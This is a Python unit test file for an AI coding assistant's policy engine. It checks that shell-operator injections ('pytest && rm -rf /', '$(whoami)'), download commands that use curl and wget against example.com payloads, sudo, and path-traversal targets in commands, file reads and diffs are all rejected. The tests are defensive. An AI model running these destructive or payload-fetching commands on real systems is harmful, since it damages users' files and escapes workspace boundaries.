"""Unit tests for Agent PolicyEngine."""

from pathlib import Path
import tempfile
import unittest

from codebase_assistant.agent.policy import PolicyEngine, SecurityPolicyError


class TestPolicyEngine(unittest.TestCase):
    """Test suite verifying security boundaries, command allowlists, and path validation."""

    def setUp(self):
        self.tmp_dir = tempfile.TemporaryDirectory()
        self.repo_dir = Path(self.tmp_dir.name)
        (self.repo_dir / "src").mkdir()
        (self.repo_dir / "src" / "main.py").write_text("x = 1\n", encoding="utf-8")
        self.policy = PolicyEngine(self.repo_dir)

    def tearDown(self):
        self.tmp_dir.cleanup()

    def test_valid_test_commands_allowed(self):
        # pytest
        cmd1 = self.policy.validate_test_command("pytest")
        self.assertEqual(cmd1[0].lower(), "pytest")

        cmd2 = self.policy.validate_test_command("pytest -v tests/test_calc.py")
        self.assertEqual(cmd2[0].lower(), "pytest")

        # python -m unittest
        cmd3 = self.policy.validate_test_command("python -m unittest discover tests/unit")
        self.assertEqual(cmd3[:3], ["python", "-m", "unittest"])

    def test_prohibited_shell_operators_rejected(self):
        dangerous_commands = [
            "pytest && rm -rf /",
            "pytest; echo hacked",
            "pytest | cat",
            "pytest > output.txt",
            "pytest >> log.txt",
            "pytest < input.txt",
            "pytest $(whoami)",
            "pytest `id`",
            "pytest &",
            "pytest \n rm test.py",
        ]
        for cmd in dangerous_commands:
            with self.assertRaises(SecurityPolicyError) as ctx:
                self.policy.validate_test_command(cmd)
            self.assertIn("prohibited shell meta-character", str(ctx.exception).lower())

    def test_unauthorized_binaries_rejected(self):
        unauthorized = [
            "rm -rf src",
            "bash -c 'pytest'",
            "sh test.sh",
            "curl https://example.com/malicious.sh",
            "wget https://example.com/payload",
            "sudo pytest",
        ]
        for cmd in unauthorized:
            with self.assertRaises(SecurityPolicyError):
                self.policy.validate_test_command(cmd)

    def test_command_path_traversal_rejected(self):
        with self.assertRaises(SecurityPolicyError) as ctx:
            self.policy.validate_test_command("pytest ../outside_tests.py")
        self.assertIn("Path traversal detected", str(ctx.exception))

    def test_command_external_absolute_path_rejected(self):
        outside_path = Path(tempfile.gettempdir()) / "outside_test.py"
        with self.assertRaises(SecurityPolicyError) as ctx:
            self.policy.validate_test_command(f"pytest {outside_path}")
        self.assertIn("Workspace boundary violation", str(ctx.exception))

    def test_command_external_symlink_rejected(self):
        with tempfile.TemporaryDirectory() as outside_dir:
            outside_file = Path(outside_dir) / "evil_test.py"
            outside_file.write_text("def test_evil(): pass\n", encoding="utf-8")
            link_path = self.repo_dir / "symlink_evil.py"
            try:
                link_path.symlink_to(outside_file)
            except (OSError, NotImplementedError):
                self.skipTest("Symlinks not supported in this environment.")

            with self.assertRaises(SecurityPolicyError) as ctx:
                self.policy.validate_test_command("pytest symlink_evil.py")
            self.assertIn("Workspace boundary violation", str(ctx.exception))

    def test_command_option_with_external_path_rejected(self):
        with self.assertRaises(SecurityPolicyError):
            self.policy.validate_test_command("pytest --rootdir=/outside/path")

        with self.assertRaises(SecurityPolicyError):
            self.policy.validate_test_command("pytest -c /outside/pytest.ini")

    def test_command_filter_expressions_allowed(self):
        cmd1 = self.policy.validate_test_command("pytest -k test_math_operation")
        self.assertIn("-k", cmd1)
        self.assertIn("test_math_operation", cmd1)

        cmd2 = self.policy.validate_test_command("pytest -m integration")
        self.assertIn("-m", cmd2)
        self.assertIn("integration", cmd2)

    def test_workspace_containment_for_files(self):
        # Valid path
        valid = self.policy.validate_file_access("src/main.py")
        self.assertEqual(valid, (self.repo_dir / "src" / "main.py").resolve())

        # Path traversal
        with self.assertRaises(SecurityPolicyError):
            self.policy.validate_file_access("../outside.py")

        with self.assertRaises(SecurityPolicyError):
            self.policy.validate_file_access("src/../../outside.py")

    def test_validate_patch_targets(self):
        valid_diff = (
            "--- a/src/main.py\n"
            "+++ b/src/main.py\n"
            "@@ -1,1 +1,1 @@\n"
            "-x = 1\n"
            "+x = 2\n"
        )
        targets = self.policy.validate_patch_targets(valid_diff)
        self.assertEqual(len(targets), 1)
        self.assertEqual(targets[0], (self.repo_dir / "src" / "main.py").resolve())

        # Traversal target in diff
        invalid_diff = (
            "--- a/src/main.py\n"
            "+++ b/../../outside.py\n"
            "@@ -1,1 +1,1 @@\n"
            "-x = 1\n"
            "+x = 2\n"
        )
        with self.assertRaises(SecurityPolicyError):
            self.policy.validate_patch_targets(invalid_diff)


if __name__ == "__main__":
    unittest.main()
